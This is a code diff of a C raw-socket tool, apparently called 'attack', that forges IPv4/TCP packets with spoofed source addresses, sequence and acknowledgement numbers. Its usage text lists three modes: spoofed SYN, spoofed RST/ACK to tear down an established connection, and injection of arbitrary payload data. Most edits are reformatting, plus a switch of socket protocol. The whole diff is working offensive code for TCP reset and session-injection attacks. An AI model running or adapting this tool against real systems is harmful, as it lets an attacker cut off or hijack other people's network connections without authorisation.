@@ -29,11 +29,10 @@ unsigned short csum_tcp(unsigned short *buf, int nwords) {
     sum += buf[8];
     sum += buf[9];
 
-    sum += htons(6);                   // TCP protocol number
-    sum += htons(20 + (nwords << 1));  // TCP header (20 bytes) + payload
+    sum += htons(6);                    // 6 = TCP protocol
+    sum += htons(20 + (nwords << 1));   // 20-byte TCP header + payload bytes
 
-    // TCP header starts at word 10, length 20 bytes = 10 words
-    // then nwords payload words
+    // TCP header starts at word 10, then 10 words of header + nwords payload
     for (int i = 10; i < 20 + nwords; ++i) {
         sum += buf[i];
     }
@@ -46,20 +45,21 @@ int main(int argc, char *argv[]) {
     if (argc < 8) {
         fprintf(stderr,
             "Usage:\n"
-            "  SYN attack : sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
-            "  RST attack : sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
+            "  SYN  attack: sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
+            "  RST  attack: sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
             "  DATA attack: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
         return 1;
     }
 
-    char mode = argv[1][0];
-    char *src_ip  = argv[2];
+    char mode      = argv[1][0];
+    char *src_ip   = argv[2];
     int   src_port = atoi(argv[3]);
-    char *dst_ip  = argv[4];
+    char *dst_ip   = argv[4];
     int   dst_port = atoi(argv[5]);
-    uint32_t seq  = (uint32_t)strtoul(argv[6], NULL, 10);
-    uint32_t ack  = (uint32_t)strtoul(argv[7], NULL, 10);
+    uint32_t seq   = (uint32_t)strtoul(argv[6], NULL, 10);
+    uint32_t ack   = (uint32_t)strtoul(argv[7], NULL, 10);
 
+    // Packet buffer: [IP header][TCP header][payload]
     char packet[4096];
     memset(packet, 0, sizeof(packet));
 
@@ -78,25 +78,25 @@ int main(int argc, char *argv[]) {
     }
 
     // --------- Build IP header (20 bytes) ----------
-    iph->ihl = 5;               // 5 * 4 = 20 bytes
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
-    iph->id = htons(54321);
+    iph->ihl      = 5;          // 5 * 4 = 20 bytes
+    iph->version  = 4;
+    iph->tos      = 0;
+    iph->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
+    iph->id       = htons(54321);
     iph->frag_off = 0;
-    iph->ttl = 64;
+    iph->ttl      = 64;
     iph->protocol = 6;          // TCP
-    iph->saddr = inet_addr(src_ip);
-    iph->daddr = inet_addr(dst_ip);
-    iph->check = 0;             // must be zero before checksum
+    iph->saddr    = inet_addr(src_ip);
+    iph->daddr    = inet_addr(dst_ip);
+    iph->check    = 0;          // zero before computing
 
     // --------- Build TCP header (20 bytes) ----------
-    tcph->source = htons(src_port);
-    tcph->dest   = htons(dst_port);
-    tcph->seq    = htonl(seq);
-    tcph->ack_seq= htonl(ack);
-    tcph->doff   = 5;           // 5 * 4 = 20 bytes, no options
-    tcph->window = htons(65535);
+    tcph->source  = htons(src_port);
+    tcph->dest    = htons(dst_port);
+    tcph->seq     = htonl(seq);
+    tcph->ack_seq = htonl(ack);
+    tcph->doff    = 5;          // 5 * 4 = 20 bytes (no options)
+    tcph->window  = htons(65535);
     tcph->urg_ptr = 0;
 
     // Clear all flags first
@@ -105,7 +105,7 @@ int main(int argc, char *argv[]) {
     if (mode == 'S') {
         // Attack 1: spoofed SYN
         tcph->syn = 1;
-        // ack_seq can be zero here
+        // ack_seq can be 0 here
     } else if (mode == 'R') {
         // Attack 2: spoofed RST,ACK to kill established connection
         tcph->rst = 1;
@@ -123,20 +123,22 @@ int main(int argc, char *argv[]) {
     unsigned short *w = (unsigned short *)packet;
 
     // IP checksum over 10 words (20 bytes)
-    iph->check  = 0;
-    iph->check  = csum_ip(w, 10);
+    iph->check = 0;
+    iph->check = csum_ip(w, 10);
 
-    // TCP checksum: payload only, in 2-byte words (rounded up)
-    int nwords = (payload_len + 1) / 2;  // payload_len=0 → nwords=0 (OK)
+    // TCP checksum: payload only, in 2-byte words (rounded up if odd)
+    int nwords = (payload_len + 1) / 2;  // payload_len=0 -> nwords=0
     tcph->check = 0;
     tcph->check = csum_tcp(w, nwords);
 
     // --------- Send via raw socket ----------
-    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    // IMPORTANT: use IPPROTO_TCP instead of IPPROTO_RAW
+    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (s < 0) {
         perror("socket");
         return 1;
     }
+
     int one = 1;
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
         perror("setsockopt IP_HDRINCL");
@@ -145,13 +147,14 @@ int main(int argc, char *argv[]) {
     }
 
     struct sockaddr_in sin;
-    sin.sin_family = AF_INET;
-    sin.sin_port = tcph->dest;
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = tcph->dest;      // ignored for raw, but set anyway
     sin.sin_addr.s_addr = iph->daddr;
 
-    int pkt_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
+    int pkt_len = ntohs(iph->tot_len);     // use what we wrote into header
 
-    if (sendto(s, packet, pkt_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+    if (sendto(s, packet, pkt_len, 0,
+               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
         perror("sendto");
         close(s);
         return 1;
